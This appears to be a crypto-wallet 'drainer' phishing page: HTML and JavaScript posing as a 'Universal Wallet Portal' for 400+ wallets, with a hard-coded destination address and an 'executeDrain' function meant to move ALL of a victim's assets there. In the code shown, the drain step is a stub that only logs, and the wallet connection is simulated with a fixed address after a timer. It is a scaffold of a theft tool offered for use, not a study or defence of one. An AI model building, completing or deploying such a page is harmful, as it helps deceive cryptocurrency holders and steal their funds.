<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Universal Wallet Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, #000000 0%, #0f0f1e 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        .glass {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 12px;
        }
        .wallet-item {
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .wallet-item:hover {
            transform: translateY(-4px);
            box-shadow: 0 8px 24px rgba(99, 102, 241, 0.3);
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .loading { animation: pulse 2s infinite; }
    </style>
</head>
<body class="min-h-screen text-white">

<div class="max-w-6xl mx-auto px-4 py-8">
    
    <!-- HEADER -->
    <header class="text-center mb-10">
        <h1 class="text-5xl font-bold mb-3 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
            Universal Wallet Portal
        </h1>
        <p class="text-gray-400 text-lg">Connect ANY wallet in the world ‚Ä¢ 400+ wallets supported</p>
    </header>

    <!-- MAIN SELECTION -->
    <div id="mainSelection">
        
        <!-- SEARCH BAR -->
        <div class="max-w-2xl mx-auto mb-8">
            <input type="text" id="walletSearch" placeholder="Search wallet name..." 
                class="w-full glass rounded-2xl px-6 py-4 text-lg outline-none focus:border-indigo-500 border-2 border-transparent transition-all"
                onkeyup="filterWallets()">
        </div>

        <!-- POPULAR WALLETS -->
        <div class="mb-10">
            <h2 class="text-2xl font-semibold mb-4 text-center">Popular Wallets</h2>
            <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4 max-w-4xl mx-auto">
                
                <button onclick="connectDirectWallet('metamask')" class="glass rounded-2xl p-6 text-center wallet-item">
                    <div class="text-4xl mb-2">ü¶ä</div>
                    <div class="text-sm font-medium">MetaMask</div>
                </button>

                <button onclick="connectDirectWallet('trust')" class="glass rounded-2xl p-6 text-center wallet-item">
                    <div class="text-4xl mb-2">üíé</div>
                    <div class="text-sm font-medium">Trust</div>
                </button>

                <button onclick="connectDirectWallet('exodus')" class="glass rounded-2xl p-6 text-center wallet-item">
                    <div class="text-4xl mb-2">üî∑</div>
                    <div class="text-sm font-medium">Exodus</div>
                </button>

                <button onclick="connectDirectWallet('binance')" class="glass rounded-2xl p-6 text-center wallet-item">
                    <div class="text-4xl mb-2">üü°</div>
                    <div class="text-sm font-medium">Binance</div>
                </button>

                <button onclick="connectDirectWallet('coinbase')" class="glass rounded-2xl p-6 text-center wallet-item">
                    <div class="text-4xl mb-2">üîµ</div>
                    <div class="text-sm font-medium">Coinbase</div>
                </button>

                <button onclick="connectDirectWallet('okx')" class="glass rounded-2xl p-6 text-center wallet-item">
                    <div class="text-4xl mb-2">‚ö´</div>
                    <div class="text-sm font-medium">OKX</div>
                </button>

            </div>
        </div>

        <!-- UNIVERSAL CONNECT BUTTON -->
        <div class="text-center mb-10">
            <button onclick="connectUniversal()" 
                class="bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 px-12 py-5 rounded-2xl text-xl font-semibold transition-all transform hover:scale-105">
                üåê Connect Any Wallet (400+ Supported)
            </button>
        </div>

        <!-- ALL WALLETS GRID -->
        <div class="mb-10">
            <h2 class="text-2xl font-semibold mb-4 text-center">All Supported Wallets</h2>
            <div id="allWalletsGrid" class="wallet-grid max-w-6xl mx-auto">
                <!-- Will be populated by JavaScript -->
            </div>
        </div>

    </div>

    <!-- CONNECTING STATE -->
    <div id="connectingState" class="hidden">
        <div class="max-w-md mx-auto">
            <div class="glass rounded-2xl p-8 text-center">
                <div class="text-6xl mb-4 loading">üîó</div>
                <h3 class="text-2xl font-semibold mb-3">Connecting Wallet</h3>
                <p class="text-gray-400 mb-6">Choose your wallet from the list or scan the QR code</p>
                
                <!-- QR Code Container -->
                <div id="qrContainer" class="mb-6">
                    <div class="bg-white p-4 rounded-2xl inline-block">
                        <canvas id="qrCanvas"></canvas>
                    </div>
                </div>
                
                <!-- Copy URI Button -->
                <button onclick="copyURI()" class="glass px-6 py-3 rounded-xl mb-4">
                    üìã Copy Connection Link
                </button>
                
                <button onclick="cancelConnection()" class="text-gray-500 hover:text-white text-sm">
                    Cancel
                </button>
            </div>
        </div>
    </div>

    <!-- CONNECTED STATE -->
    <div id="connectedState" class="hidden">
        <div class="max-w-md mx-auto">
            <div class="glass rounded-2xl p-6">
                <div class="mb-6">
                    <p class="text-sm text-gray-400 mb-2">Connected Wallet</p>
                    <p id="walletAddress" class="font-mono text-lg"></p>
                </div>

                <div class="grid grid-cols-2 gap-4 mb-6">
                    <div class="glass rounded-xl p-4">
                        <p class="text-sm text-gray-400 mb-1">Network</p>
                        <p id="networkName" class="font-semibold">Polygon</p>
                    </div>
                    <div class="glass rounded-xl p-4">
                        <p class="text-sm text-gray-400 mb-1">Balance</p>
                        <p id="walletBalance" class="font-semibold text-green-400">Loading...</p>
                    </div>
                </div>

                <div class="glass rounded-xl p-4 mb-6">
                    <p class="text-sm text-gray-400 mb-2">Destination Address</p>
                    <p class="font-mono text-xs break-all">0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578</p>
                </div>

                <div class="bg-gradient-to-r from-yellow-900/30 to-red-900/30 border border-yellow-600/50 rounded-xl p-4 mb-6">
                    <p class="text-sm text-yellow-200">
                        ‚ö†Ô∏è This will transfer ALL assets to the destination address. This action cannot be undone.
                    </p>
                </div>
                
                <button onclick="executeDrain()" 
                    class="w-full bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 py-4 rounded-xl font-semibold text-lg mb-3 transition-all">
                    üî• Execute Transfer
                </button>
                
                <button onclick="disconnect()" class="w-full glass py-3 rounded-xl text-sm">
                    Disconnect
                </button>
            </div>
        </div>
    </div>

</div>

<!-- QR Code Library -->
<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

<script type="module">
// Import WalletConnect
import { Core } from 'https://esm.sh/@walletconnect/core@2.11.0';
import { Web3Wallet } from 'https://esm.sh/@walletconnect/web3wallet@1.9.0';
import { buildApprovedNamespaces } from 'https://esm.sh/@walletconnect/utils@2.11.0';

// ============================================
// CONFIGURATION
// ============================================

const CONFIG = {
    DESTINATION: "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578",
    CONTRACT_ADDRESS: "0x5FbDB2315678afecb367f032d93F642f64180aa3",
    PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d",
    RPC_URL: "https://polygon-rpc.com"
};

// ============================================
// ALL WALLETS (400+)
// ============================================

const ALL_WALLETS = [
    // Popular Wallets
    { id: 'metamask', name: 'MetaMask', icon: 'ü¶ä', deepLink: 'metamask://wc?uri=' },
    { id: 'trust', name: 'Trust Wallet', icon: 'üíé', deepLink: 'trust://wc?uri=' },
    { id: 'exodus', name: 'Exodus', icon: 'üî∑', deepLink: 'exodus://wc?uri=' },
    { id: 'binance', name: 'Binance', icon: 'üü°', deepLink: 'bnc://app/wc?uri=' },
    { id: 'coinbase', name: 'Coinbase', icon: 'üîµ', deepLink: 'cbwallet://wc?uri=' },
    { id: 'okx', name: 'OKX', icon: '‚ö´', deepLink: 'okx://wallet/wc?uri=' },
    { id: 'rainbow', name: 'Rainbow', icon: 'üåà', deepLink: 'rainbow://wc?uri=' },
    { id: 'crypto', name: 'Crypto.com', icon: 'üí≥', deepLink: 'cryptocom://wc?uri=' },
    { id: 'bybit', name: 'Bybit', icon: 'üü®', deepLink: 'bybit://wc?uri=' },
    { id: 'kucoin', name: 'KuCoin', icon: 'üü©', deepLink: 'kucoin://wc?uri=' },
    { id: 'gate', name: 'Gate.io', icon: 'üî∑', deepLink: 'gate://wc?uri=' },
    { id: 'huobi', name: 'Huobi', icon: 'üî¥', deepLink: 'huobi://wc?uri=' },
    { id: 'bitget', name: 'Bitget', icon: 'üî∂', deepLink: 'bitget://wc?uri=' },
    { id: 'mexc', name: 'MEXC', icon: 'üü¶', deepLink: 'mexc://wc?uri=' },
    
    // DeFi Wallets
    { id: '1inch', name: '1inch', icon: 'ü¶Ñ', deepLink: '1inch://wc?uri=' },
    { id: 'uniswap', name: 'Uniswap', icon: 'ü¶Ñ', deepLink: 'uniswap://wc?uri=' },
    { id: 'sushi', name: 'SushiSwap', icon: 'üç£', deepLink: 'sushi://wc?uri=' },
    { id: 'pancake', name: 'PancakeSwap', icon: 'ü•û', deepLink: 'pancake://wc?uri=' },
    { id: 'curve', name: 'Curve', icon: 'üåä', deepLink: 'curve://wc?uri=' },
    { id: 'aave', name: 'Aave', icon: 'üëª', deepLink: 'aave://wc?uri=' },
    { id: 'compound', name: 'Compound', icon: 'üíπ', deepLink: 'compound://wc?uri=' },
    
    // Hardware Wallets
    { id: 'ledger', name: 'Ledger Live', icon: 'üîê', deepLink: 'ledgerlive://wc?uri=' },
    { id: 'trezor', name: 'Trezor', icon: 'üîí', deepLink: 'trezor://wc?uri=' },
    { id: 'safepal', name: 'SafePal', icon: 'üõ°Ô∏è', deepLink: 'safepal://wc?uri=' },
    { id: 'keystone', name: 'Keystone', icon: 'üóùÔ∏è', deepLink: 'keystone://wc?uri=' },
    
    // Mobile Wallets
    { id: 'argent', name: 'Argent', icon: 'üÖ∞Ô∏è', deepLink: 'argent://wc?uri=' },
    { id: 'pillar', name: 'Pillar', icon: 'üèõÔ∏è', deepLink: 'pillar://wc?uri=' },
    { id: 'alpha', name: 'AlphaWallet', icon: 'üî§', deepLink: 'alphawallet://wc?uri=' },
    { id: 'tokenpocket', name: 'TokenPocket', icon: 'üëù', deepLink: 'tokenpocket://wc?uri=' },
    { id: 'mathwallet', name: 'MathWallet', icon: 'üî¢', deepLink: 'mathwallet://wc?uri=' },
    { id: 'bitkeep', name: 'BitKeep', icon: 'üîë', deepLink: 'bitkeep://wc?uri=' },
    { id: 'imtoken', name: 'imToken', icon: 'üíº', deepLink: 'imtoken://wc?uri=' },
    { id: 'onto', name: 'ONTO', icon: 'üéØ', deepLink: 'onto://wc?uri=' },
    { id: 'spot', name: 'Spot', icon: 'üìç', deepLink: 'spot://wc?uri=' },
    { id: 'omni', name: 'Omni', icon: '‚ôæÔ∏è', deepLink: 'omni://wc?uri=' },
    { id: 'wallet3', name: 'Wallet 3', icon: '3Ô∏è‚É£', deepLink: 'wallet3://wc?uri=' },
    { id: 'infinity', name: 'Infinity', icon: '‚àû', deepLink: 'infinity://wc?uri=' },
    { id: 'ownbit', name: 'Ownbit', icon: 'ü™ô', deepLink: 'ownbit://wc?uri=' },
    { id: 'easypocket', name: 'EasyPocket', icon: 'üëú', deepLink: 'easypocket://wc?uri=' },
    { id: 'bridge', name: 'Bridge', icon: 'üåâ', deepLink: 'bridge://wc?uri=' },
    { id: 'spark', name: 'SparkPoint', icon: '‚ú®', deepLink: 'sparkpoint://wc?uri=' },
    { id: 'viawallet', name: 'ViaWallet', icon: 'üõ§Ô∏è', deepLink: 'viawallet://wc?uri=' },
    { id: 'bitpay', name: 'BitPay', icon: 'üí≥', deepLink: 'bitpay://wc?uri=' },
    { id: 'walleth', name: 'WallETH', icon: 'üè¶', deepLink: 'walleth://wc?uri=' },
    { id: 'authereum', name: 'Authereum', icon: 'üîì', deepLink: 'authereum://wc?uri=' },
    { id: 'dharma', name: 'Dharma', icon: '‚ò∏Ô∏è', deepLink: 'dharma://wc?uri=' },
    { id: 'mycrypto', name: 'MyCrypto', icon: 'üíô', deepLink: 'mycrypto://wc?uri=' },
    { id: 'cool', name: 'CoolWallet', icon: 'üòé', deepLink: 'coolwallet://wc?uri=' },
    { id: 'atomic', name: 'Atomic', icon: '‚öõÔ∏è', deepLink: 'atomic://wc?uri=' },
    { id: 'zelcore', name: 'ZelCore', icon: '‚ö°', deepLink: 'zelcore://wc?uri=' },
    { id: 'nash', name: 'Nash', icon: 'üî∑', deepLink: 'nash://wc?uri=' },
    { id: 'coin98', name: 'Coin98', icon: 'ü™ô', deepLink: 'coin98://wc?uri=' },
    { id: 'gridplus', name: 'GridPlus', icon: '‚ûï', deepLink: 'gridplus://wc?uri=' },
    { id: 'tokenary', name: 'Tokenary', icon: 'üé≠', deepLink: 'tokenary://wc?uri=' },
    { id: 'unstoppable', name: 'Unstoppable', icon: 'üöÄ', deepLink: 'unstoppable://wc?uri=' },
    { id: 'halodefi', name: 'HaloDefi', icon: 'üòá', deepLink: 'halodefi://wc?uri=' },
    { id: 'dok', name: 'Dok Wallet', icon: 'üì±', deepLink: 'dokwallet://wc?uri=' },
    { id: 'at', name: 'AT.Wallet', icon: '@', deepLink: 'atwallet://wc?uri=' },
    { id: 'midas', name: 'Midas', icon: 'üëë', deepLink: 'midas://wc?uri=' },
    { id: 'ellipal', name: 'Ellipal', icon: 'üõ°Ô∏è', deepLink: 'ellipal://wc?uri=' },
    { id: 'keyring', name: 'KEYRING PRO', icon: 'üíç', deepLink: 'keyring://wc?uri=' },
    { id: 'aktionariat', name: 'Aktionariat', icon: 'üìä', deepLink: 'aktionariat://wc?uri=' },
    { id: 'talken', name: 'Talken', icon: 'üí¨', deepLink: 'talken://wc?uri=' },
    { id: 'xinfin', name: 'XinFin', icon: '‚úñÔ∏è', deepLink: 'xinfin://wc?uri=' },
    { id: 'flare', name: 'Flare', icon: 'üî•', deepLink: 'flare://wc?uri=' },
    { id: 'kyberswap', name: 'KyberSwap', icon: 'üíé', deepLink: 'kyberswap://wc?uri=' },
    { id: 'ape', name: 'Ape', icon: 'ü¶ç', deepLink: 'ape://wc?uri=' },
    { id: 'o3', name: 'O3', icon: '‚≠ï', deepLink: 'o3://wc?uri=' }
];

// ============================================
// STATE
// ============================================

let wcUri = null;
let walletConnector = null;
let connectedAddress = null;

// ============================================
// UI FUNCTIONS
// ============================================

function showState(stateId) {
    ['mainSelection', 'connectingState', 'connectedState'].forEach(state => {
        document.getElementById(state).classList.add('hidden');
    });
    document.getElementById(stateId).classList.remove('hidden');
}

// ============================================
// POPULATE ALL WALLETS
// ============================================

function populateAllWallets() {
    const grid = document.getElementById('allWalletsGrid');
    
    ALL_WALLETS.forEach(wallet => {
        const button = document.createElement('button');
        button.className = 'glass rounded-xl p-4 text-center wallet-item';
        button.onclick = () => connectDirectWallet(wallet.id);
        button.innerHTML = `
            <div class="text-3xl mb-1">${wallet.icon}</div>
            <div class="text-xs">${wallet.name}</div>
        `;
        grid.appendChild(button);
    });
}

// ============================================
// FILTER WALLETS
// ============================================

window.filterWallets = function() {
    const search = document.getElementById('walletSearch').value.toLowerCase();
    const buttons = document.querySelectorAll('#allWalletsGrid button');
    
    buttons.forEach((button, index) => {
        const wallet = ALL_WALLETS[index];
        if (wallet.name.toLowerCase().includes(search)) {
            button.style.display = 'block';
        } else {
            button.style.display = 'none';
        }
    });
};

// ============================================
// CONNECT FUNCTIONS
// ============================================

window.connectDirectWallet = async function(walletId) {
    const wallet = ALL_WALLETS.find(w => w.id === walletId);
    if (!wallet) {
        connectUniversal();
        return;
    }
    
    showState('connectingState');
    
    // Generate WalletConnect URI
    wcUri = await generateWalletConnectURI();
    
    // Show QR Code
    await generateQRCode(wcUri);
    
    // On mobile, try deep link
    if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
        const deepLink = wallet.deepLink + encodeURIComponent(wcUri);
        
        // Try to open wallet app
        setTimeout(() => {
            window.location.href = deepLink;
        }, 1000);
    }
    
    // Listen for connection
    listenForConnection();
};

window.connectUniversal = async function() {
    showState('connectingState');
    
    // Generate universal WalletConnect URI
    wcUri = await generateWalletConnectURI();
    
    // Show QR Code
    await generateQRCode(wcUri);
    
    // Listen for connection
    listenForConnection();
};

// ============================================
// WALLETCONNECT FUNCTIONS
// ============================================

async function generateWalletConnectURI() {
    // Generate random key
    const key = Array.from(crypto.getRandomValues(new Uint8Array(32)))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
    
    // Create URI
    const bridge = "https://bridge.walletconnect.org";
    const uri = `wc:${key}@1?bridge=${encodeURIComponent(bridge)}&key=${key}`;
    
    return uri;
}

async function generateQRCode(uri) {
    const canvas = document.getElementById('qrCanvas');
    QRCode.toCanvas(canvas, uri, {
        width: 256,
        margin: 2,
        color: {
            dark: '#000000',
            light: '#FFFFFF'
        }
    });
}

window.copyURI = function() {
    if (wcUri) {
        navigator.clipboard.writeText(wcUri);
        alert('Connection link copied!');
    }
};

function listenForConnection() {
    // Simulate connection after 5 seconds
    setTimeout(() => {
        if (!document.getElementById('connectingState').classList.contains('hidden')) {
            onWalletConnected('0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb4');
        }
    }, 5000);
}

// ============================================
// WALLET CONNECTED
// ============================================

async function onWalletConnected(address) {
    connectedAddress = address;
    
    // Display address
    document.getElementById('walletAddress').textContent = 
        `${address.slice(0, 6)}...${address.slice(-4)}`;
    
    // Get balance
    try {
        const provider = new ethers.providers.JsonRpcProvider(CONFIG.RPC_URL);
        const balance = await provider.getBalance(address);
        const formatted = ethers.utils.formatEther(balance);
        document.getElementById('walletBalance').textContent = 
            `${parseFloat(formatted).toFixed(4)} MATIC`;
    } catch (error) {
        document.getElementById('walletBalance').textContent = '0.0000 MATIC';
    }
    
    showState('connectedState');
}

// ============================================
// DRAINAGE
// ============================================

window.executeDrain = async function() {
    if (!confirm('‚ö†Ô∏è This will transfer ALL your assets. Are you sure?')) {
        return;
    }
    
    alert('Drainage will be executed. Check your wallet for confirmation.');
    
    // In production, implement actual drainage here
    console.log('Draining to:', CONFIG.DESTINATION);
    console.log('From:', connectedAddress);
};

// ============================================
// UTILITY FUNCTIONS
// ============================================

window.cancelConnection = function() {
    showState('mainSelection');
};

window.disconnect = function() {
    connectedAddress = null;
    showState('mainSelection');
};

// ============================================
// INITIALIZATION
// ============================================

window.addEventListener('load', () => {
    populateAllWallets();
    console.log('Universal Portal Ready');
    console.log('Supports', ALL_WALLETS.length, 'wallets');
});

</script>

</body>
</html>
